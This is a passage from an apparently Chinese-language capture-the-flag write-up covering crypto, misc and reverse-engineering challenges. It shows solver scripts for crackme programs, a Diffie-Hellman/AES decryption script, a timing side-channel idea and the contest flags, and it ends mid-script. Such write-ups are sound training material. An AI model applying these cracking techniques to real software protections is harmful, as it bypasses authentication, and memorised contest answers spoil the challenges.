rel="noopener">http://huashan.xdsec.cn/mima/</a></p><p>利用“php很烦人”那题得到index.php源码，flag就在其中</p><p><a href="https://github.com/SpiderLabs/CryptOMG/blob/master/ctf/challenge3/index.php" target="_blank" rel="noopener">参考链接</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> gjVGaqJZOnjm54LirXgElRIAOnb8oVEWfkj/7medMRU= | base64 -d | xxd</span><br><span class="line">00000000: 8235 466a a259 3a78 e6e7 82e2 ad78 0495  .5Fj.Y:x.....x..</span><br><span class="line">00000010: 1200 3a76 fca1 5116 7e48 ffee 679d 3115  ..:v..Q.~H..g.1.</span><br></pre></td></tr></table></figure><p>从侧信道攻击的角度考虑，我们可以依次比较每个字符，对于不同的输入数据，执行10000次操作，耗费的时间是不同的，这样逐个字符破解，就可以得到目标值。</p><p>###6、 协议？认证？加密？(300)</p><blockquote><p>协议？认证？加密？</p></blockquote><p>安全也需要融合！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Copyright (c) 7 team  All rights reserved</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">g = <span class="number">7</span></span><br><span class="line">p = <span class="number">1023789085312022807</span></span><br><span class="line">A = <span class="number">651518302569801068</span></span><br><span class="line">B = <span class="number">310117834581236149</span></span><br><span class="line">secret = <span class="number">0x5365637263742064617461210a2fa0c7a10e0d87a58f52bd</span></span><br><span class="line"><span class="comment">#flag = 'KeyXchge-N0t-So-Easy*Humen'</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">myA = <span class="number">7</span></span><br><span class="line">a = <span class="number">274389752</span></span><br><span class="line">s = gmpy2.powmod(B, a, p)</span><br><span class="line"><span class="comment">#s = 844469193616983517</span></span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">key = s</span><br><span class="line"><span class="keyword">print</span> len(key)</span><br><span class="line">length = <span class="number">128</span></span><br><span class="line">count = len(key)</span><br><span class="line"><span class="keyword">if</span> count != length:</span><br><span class="line">    key = <span class="string">b'0'</span> * (length - count) + bin(key)[<span class="number">2</span>:]</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line"><span class="comment">#print len(key)</span></span><br><span class="line"></span><br><span class="line">char = re.findall(<span class="string">r'.&#123;8&#125;'</span>, key)</span><br><span class="line">string = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> cha <span class="keyword">in</span> char:</span><br><span class="line">    cha = hex(int(cha, <span class="number">2</span>))</span><br><span class="line">    <span class="comment">#cha = cha &amp; 0xff</span></span><br><span class="line">    <span class="comment">#string += chr(int(cha, 16))</span></span><br><span class="line">    string  = a2b_hex(cha)</span><br><span class="line">key = string</span><br><span class="line"><span class="keyword">print</span> key</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypo</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    crypter = AES.new(bin(key), mode, bin(key))</span><br><span class="line">    flag = crypter.decrypt(a2b_hex(cipher))</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">flag = decrypo(secret)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag: '</span> + flag</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>###1、Try Everything(200)</p><blockquote><p>Try Everything  try everything you can to get flag, and DO NOT ASK MANAGER THE FLAG.</p></blockquote><p>这题的file若是直接解压的话，得到的内容是乱序的，但是仔细一看flag形式的字样都有，于是关键是如何调整顺序，这里借用binwalk</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:31:46%20" alt=""></p><p>得到文件的偏移量<br>里面文件每个地址对应了不同的文件名（序号还不同），所以只要把里面的offset整理好，然后写个脚本分离源文件到各个小文件，然后解压，再按数字来排序就可以。<br>以下脚本基于自己先整理出了offset，以及建立了一个out文件夹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">f_all=open(<span class="string">'file'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line"><span class="comment">#print len(f_all)</span></span><br><span class="line">l1=[<span class="number">0</span>   , <span class="number">24</span>  , <span class="number">48</span>  , <span class="number">73</span>  , <span class="number">98</span>  , <span class="number">122</span> , <span class="number">146</span> , <span class="number">170</span> , <span class="number">195</span> , <span class="number">220</span> , <span class="number">245</span> , <span class="number">270</span> , <span class="number">295</span> , <span class="number">319</span> , <span class="number">344</span> , <span class="number">368</span> , <span class="number">393</span> , <span class="number">418</span> , <span class="number">443</span> , <span class="number">467</span> , <span class="number">491</span> , <span class="number">515</span> , <span class="number">539</span> , <span class="number">562</span> , <span class="number">586</span> , <span class="number">611</span> , <span class="number">635</span> , <span class="number">659</span> , <span class="number">683</span> , <span class="number">708</span> , <span class="number">732</span> , <span class="number">756</span> , <span class="number">781</span> , <span class="number">806</span> , <span class="number">829</span> , <span class="number">853</span> , <span class="number">877</span> , <span class="number">901</span> , <span class="number">925</span> , <span class="number">950</span> , <span class="number">975</span> , <span class="number">999</span> , <span class="number">1024</span>, <span class="number">1048</span>, <span class="number">1071</span>, <span class="number">1095</span>, <span class="number">1120</span>, <span class="number">1144</span>, <span class="number">1168</span>, <span class="number">1192</span>, <span class="number">1216</span>, <span class="number">1241</span>, <span class="number">1265</span>, <span class="number">1290</span>, <span class="number">1315</span>, <span class="number">1340</span>, <span class="number">1364</span>, <span class="number">1389</span>, <span class="number">1412</span>, <span class="number">1436</span>, <span class="number">1460</span>, <span class="number">1484</span>, <span class="number">1508</span>, <span class="number">1533</span>, <span class="number">1557</span>, <span class="number">1582</span>, <span class="number">1607</span>, <span class="number">1631</span>, <span class="number">1656</span>, <span class="number">1681</span>, <span class="number">1705</span>, <span class="number">1729</span>, <span class="number">1753</span>, <span class="number">1777</span>, <span class="number">1802</span>, <span class="number">1825</span>, <span class="number">1849</span>, <span class="number">1873</span>, <span class="number">1898</span>, <span class="number">1923</span>, <span class="number">1947</span>, <span class="number">1971</span>, <span class="number">1995</span>, <span class="number">2020</span>, <span class="number">2044</span>, <span class="number">2069</span>, <span class="number">2094</span>, <span class="number">2118</span>, <span class="number">2143</span>, <span class="number">2167</span>, <span class="number">2191</span>, <span class="number">2215</span>, <span class="number">2239</span>, <span class="number">2264</span>, <span class="number">2288</span>, <span class="number">2313</span>, <span class="number">2338</span>, <span class="number">2363</span>, <span class="number">2387</span>, <span class="number">2412</span>, <span class="number">2437</span>, <span class="number">2462</span>, <span class="number">2486</span>, <span class="number">2511</span>, <span class="number">2536</span>, <span class="number">2560</span>, <span class="number">2584</span>, <span class="number">2609</span>, <span class="number">2634</span>, <span class="number">2658</span>, <span class="number">2682</span>, <span class="number">2707</span>, <span class="number">2731</span>, <span class="number">2755</span>, <span class="number">2780</span>, <span class="number">2805</span>, <span class="number">2829</span>, <span class="number">2854</span>, <span class="number">2878</span>, <span class="number">2902</span>, <span class="number">2926</span>, <span class="number">2950</span>, <span class="number">2974</span>, <span class="number">2998</span>, <span class="number">3022</span>, <span class="number">3046</span>, <span class="number">3071</span>, <span class="number">3096</span>, <span class="number">3120</span>, <span class="number">3145</span>, <span class="number">3170</span>, <span class="number">3195</span>, <span class="number">3220</span>, <span class="number">3245</span>, <span class="number">3269</span>, <span class="number">3293</span>, <span class="number">3316</span>, <span class="number">3340</span>, <span class="number">3364</span>, <span class="number">3389</span>, <span class="number">3413</span>, <span class="number">3437</span>, <span class="number">3462</span>, <span class="number">3486</span>, <span class="number">3511</span>, <span class="number">3534</span>, <span class="number">3559</span>, <span class="number">3583</span>, <span class="number">3607</span>, <span class="number">3631</span>, <span class="number">3655</span>, <span class="number">3679</span>, <span class="number">3704</span>, <span class="number">3727</span>, <span class="number">3751</span>, <span class="number">3774</span>, <span class="number">3798</span>, <span class="number">3822</span>, <span class="number">3847</span>, <span class="number">3870</span>, <span class="number">3894</span>, <span class="number">3918</span>, <span class="number">3942</span>, <span class="number">3966</span>, <span class="number">3990</span>] <span class="comment">#最后一个是len(f_all)</span></span><br><span class="line">l2=[<span class="number">24</span>,<span class="number">72</span>,<span class="number">108</span>,<span class="number">129</span>,<span class="number">18</span>,<span class="number">92</span>,<span class="number">63</span>,<span class="number">162</span>,<span class="number">110</span>,<span class="number">156</span>,<span class="number">132</span>,<span class="number">101</span>,<span class="number">34</span>,<span class="number">143</span>,<span class="number">28</span>,<span class="number">136</span>,<span class="number">115</span>,<span class="number">114</span>,<span class="number">17</span>,<span class="number">14</span>,<span class="number">69</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">127</span>,<span class="number">55</span>,<span class="number">58</span>,<span class="number">86</span>,<span class="number">149</span>,<span class="number">21</span>,<span class="number">41</span>,<span class="number">120</span>,<span class="number">142</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">88</span>,<span class="number">133</span>,<span class="number">161</span>,<span class="number">35</span>,<span class="number">137</span>,<span class="number">31</span>,<span class="number">3</span>,<span class="number">20</span>,<span class="number">113</span>,<span class="number">46</span>,<span class="number">42</span>,<span class="number">91</span>,<span class="number">78</span>,<span class="number">102</span>,<span class="number">19</span>,<span class="number">135</span>,<span class="number">153</span>,<span class="number">105</span>,<span class="number">48</span>,<span class="number">107</span>,<span class="number">9</span>,<span class="number">68</span>,<span class="number">64</span>,<span class="number">81</span>,<span class="number">93</span>,<span class="number">147</span>,<span class="number">67</span>,<span class="number">138</span>,<span class="number">160</span>,<span class="number">85</span>,<span class="number">106</span>,<span class="number">154</span>,<span class="number">75</span>,<span class="number">89</span>,<span class="number">66</span>,<span class="number">26</span>,<span class="number">141</span>,<span class="number">2</span>,<span class="number">98</span>,<span class="number">96</span>,<span class="number">124</span>,<span class="number">145</span>,<span class="number">84</span>,<span class="number">71</span>,<span class="number">15</span>,<span class="number">140</span>,<span class="number">90</span>,<span class="number">144</span>,<span class="number">100</span>,<span class="number">61</span>,<span class="number">131</span>,<span class="number">27</span>,<span class="number">23</span>,<span class="number">53</span>,<span class="number">40</span>,<span class="number">130</span>,<span class="number">47</span>,<span class="number">117</span>,<span class="number">148</span>,<span class="number">150</span>,<span class="number">50</span>,<span class="number">111</span>,<span class="number">122</span>,<span class="number">146</span>,<span class="number">57</span>,<span class="number">121</span>,<span class="number">123</span>,<span class="number">82</span>,<span class="number">45</span>,<span class="number">152</span>,<span class="number">109</span>,<span class="number">62</span>,<span class="number">70</span>,<span class="number">116</span>,<span class="number">77</span>,<span class="number">12</span>,<span class="number">139</span>,<span class="number">155</span>,<span class="number">80</span>,<span class="number">103</span>,<span class="number">13</span>,<span class="number">74</span>,<span class="number">16</span>,<span class="number">51</span>,<span class="number">94</span>,<span class="number">87</span>,<span class="number">97</span>,<span class="number">25</span>,<span class="number">151</span>,<span class="number">128</span>,<span class="number">54</span>,<span class="number">125</span>,<span class="number">112</span>,<span class="number">119</span>,<span class="number">118</span>,<span class="number">158</span>,<span class="number">99</span>,<span class="number">95</span>,<span class="number">4</span>,<span class="number">38</span>,<span class="number">79</span>,<span class="number">157</span>,<span class="number">29</span>,<span class="number">33</span>,<span class="number">134</span>,<span class="number">30</span>,<span class="number">126</span>,<span class="number">1</span>,<span class="number">104</span>,<span class="number">52</span>,<span class="number">65</span>,<span class="number">44</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">163</span>,<span class="number">0</span>,<span class="number">76</span>,<span class="number">5</span>,<span class="number">60</span>,<span class="number">59</span>,<span class="number">159</span>,<span class="number">8</span>,<span class="number">49</span>,<span class="number">32</span>,<span class="number">43</span>,<span class="number">56</span>,<span class="number">39</span>]</span><br><span class="line"></span><br><span class="line">fname_list=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(l2)):</span><br><span class="line">s=f_all[l1[i]:l1[i+<span class="number">1</span>]]</span><br><span class="line">fname=l2[i]</span><br><span class="line"><span class="comment">#gz文件</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">r'out\%d.gz'</span> %fname,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(s)</span><br><span class="line">fname_list.append(fname)</span><br><span class="line">fname_list.sort() <span class="comment">#从小到大排序</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> fname <span class="keyword">in</span> fname_list:</span><br><span class="line">flag+=gzip.open(<span class="string">r'out\%d.gz'</span> %fname,<span class="string">'rb'</span>).read()</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">foo()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'ok'</span></span><br></pre></td></tr></table></figure><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:33:51%20" alt=""></p><p>###2、挣脱牢笼</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><p>###1、Waring Up(100)</p><blockquote><p>Warming Up</p></blockquote><p>Crack the easy program crackme, the key is your correct inpu</p><p>Crack the easy program crackme, the key is your correct input<br>直接IDA打开，来到main_0()，程序主流程在这此函数里</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:37:08%20" alt=""></p><p>v4获取输入，v3为输入字串长度，然后进sub_401005()进行字串处理，sub_40100A()为结果比较。先看下结果比较函数：</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:39:04%20" alt=""></p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:40:05%20" alt=""></p><p>可以看出，处理过的输入与”VgobmndVlBVE”官串比较。<br>再看输入字串处理函数，sub_401005()直接跳到地址40DBF0。<br>关键处理操作如图：</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:41:33%20" alt=""></p><p>写个小脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">"VgobmndVlBVE"</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> index, item <span class="keyword">in</span> enumerate(target):</span><br><span class="line">result += chr(ord(item)^(((index)%<span class="number">3</span>)+<span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> result</span><br></pre></td></tr></table></figure><p>###2、到手的钥匙(100)</p><blockquote><p>到手的钥匙。现在已经确定截获到一个对方用来传递密钥的程序，但是如何才能拿到密钥？</p></blockquote><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:43:39%20" alt=""></p><p>一个是帐号 一个是密码</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:44:48%20" alt=""></p><p>屏幕输出一堆奇怪的东西<br>帐号+密码+这一堆  就是flag了</p><p>###3、忘记用户名(100)</p><blockquote><p>忘记用户名。过了好久，用户名都不记得了，难道只能重置了么</p></blockquote><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:55:34%20" alt=""></p><p> 做了简单的加减</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">'ILoveXD'</span></span><br><span class="line">ct=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> a:</span><br><span class="line"> <span class="keyword">print</span> chr(ord(c)+<span class="number">7</span>-ct)</span><br><span class="line"> ct=ct+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>###4、Help me(150)</p><blockquote><p>Help me</p></blockquote><p>What’s wrong with my program? Who can crack this? Do me a favor…</p><p>直接扔进IDA，如图：</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:59:11%20" alt=""></p><p>其中有些空代码，还有些不太正确的语句。程序是不能正常运行的。如开始处的v10,v0等。main()函数中前面一部分主要是一些打印语句，求字串长度及一些赋值操作。这里有四个赋值下面需要用到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword_40CF70 = 1;</span><br><span class="line">dword_40CF74 = -1;</span><br><span class="line">dword_40CF78 = -2;</span><br><span class="line">v3 = lstrlenA(String);</span><br></pre></td></tr></table></figure><p>再看下面的if语句</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:59:40%20" alt=""></p><p>第一个if中的v3为String的长度，String为’rev3rs3_ana1ys1s’。里面是一个do…while语句，里面是一些if 语句，根据上面列出的赋值语句，直接到达下图的关键字串处理部分：</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:00:01%20" alt=""></p><p>现在逻辑就很清晰了<br>字串与9异或，以16进制形式输出结果。用python计算结果如图</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:10:48%20" alt=""></p><p>###5、捉迷藏(150)</p><blockquote><p>捉迷藏。文件一定要保存好，不要像这个程序一样随便一diu~  PS：建议在win32环境下测试</p></blockquote><p>用IDA打开 能看到用户名</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:13:38%20" alt=""></p><p>密码随便输入14个1，发现14个1变为base64编码和另一串比<br>下断点得到base64的编码，解码得到OnYourComputer</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:15:19%20" alt=""></p><p>sub_13D1D00内会把用户名+密码+ArvinShow存到<br>系统临时目录/flag.jpg，flag即为</p><p><code>FindKeyOnYourComputerArvinShow</code></p><p>###6、移动迷宫(200)</p><blockquote><p>移动迷宫。当赶到的时候发现对方已经提前接头了，但在现场遗留了一个U盘并恢复出了一个登陆程序，如何才能拿到密钥？</p></blockquote><p>程序就是个简单的走迷宫<br>输入的东西，进行各简单变化，对应于走的方向</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:21:11%20" alt=""></p><p>走的逻辑是</p><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:22:02%20" alt=""></p><p>根据坐标生成方向即可，逆代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">map_info = <span class="string">"***********####******#**#*****##*##********#*********#*#####***###***#*********#*********#********##"</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">pos_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(map_info)):</span><br><span class="line">result += map_info[i]</span><br><span class="line"></span><br><span class="line">y = (i)%<span class="number">10</span></span><br><span class="line">x = i/<span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> (i+<span class="number">1</span>)%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">result += <span class="string">"\n"</span></span><br><span class="line"><span class="keyword">if</span> map_info[i] == <span class="string">"#"</span>:</span><br><span class="line">pos_list.append((x, y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> map_info[<span class="number">0x28</span>]</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"><span class="keyword">print</span> pos_list</span><br><span class="line"></span><br><span class="line">last = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">way_list = []</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">-1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">-1</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">-1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">-1</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> len(way_list)</span><br><span class="line">map_dic = &#123;&#125;</span><br><span class="line">map_dic[(<span class="number">-1</span>, <span class="number">0</span>)] = <span class="number">3</span></span><br><span class="line">map_dic[(<span class="number">1</span>, <span class="number">0</span>)] = <span class="number">4</span></span><br><span class="line">map_dic[(<span class="number">0</span>, <span class="number">-1</span>)] = <span class="number">1</span></span><br><span class="line">map_dic[(<span class="number">0</span>, <span class="number">1</span>)] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> way_list:</span><br><span class="line">result.append(map_dic[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">way_key = <span class="string">"""0A1B</span></span><br><span class="line"><span class="string">a2b3</span></span><br><span class="line"><span class="string">4C5D</span></span><br><span class="line"><span class="string">c6d7</span></span><br><span class="line"><span class="string">8E9F</span></span><br><span class="line"><span class="string">e0f1"""</span></span><br><span class="line"></span><br><span class="line">way_key = way_key.split(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"><span class="keyword">print</span> len(result)</span><br><span class="line">result_info = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">result_info += way_key[j][result[i*<span class="number">6</span>+j]<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> way_key</span><br><span class="line"><span class="keyword">print</span> result_info</span><br></pre></td></tr></table></figure><p><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:25:54%20" alt=""></p><p>###7、 Do something(200)</p><blockquote><p>Do something登录程序后收到了一张图片，这其中会有什么蹊跷？已更新，可以继续做题～binwalk从png中分离exe</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">程序让输入用户名 符合一系列条件</span><br><span class="line">a1=a9</span><br><span class="line">a1=aa</span><br><span class="line">a2=ab</span><br><span class="line">a3=a5</span><br><span class="line">a4=a6</span><br><span class="line">ac=5</span><br><span class="line">a8=3*a 24</span><br><span class="line">ad&gt;5*a 4b</span><br><span class="line">ae=2*a 1a</span><br><span class="line">a4&gt;3*a 27</span><br><span class="line">a1&gt;a4</span><br><span class="line">21&gt;a1</span><br><span class="line">a1=ad+a7</span><br><span class="line">a7=2*a 20</span><br><span class="line">a3&gt;4*a 3c</span><br><span class="line">a7&gt;a3</span><br><span class="line">a3%3=0</span><br><span class="line">a2&gt;7</span><br><span class="line">a3&gt;a2</span><br></pre></td></tr></table></figure><p>写给脚本跑一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 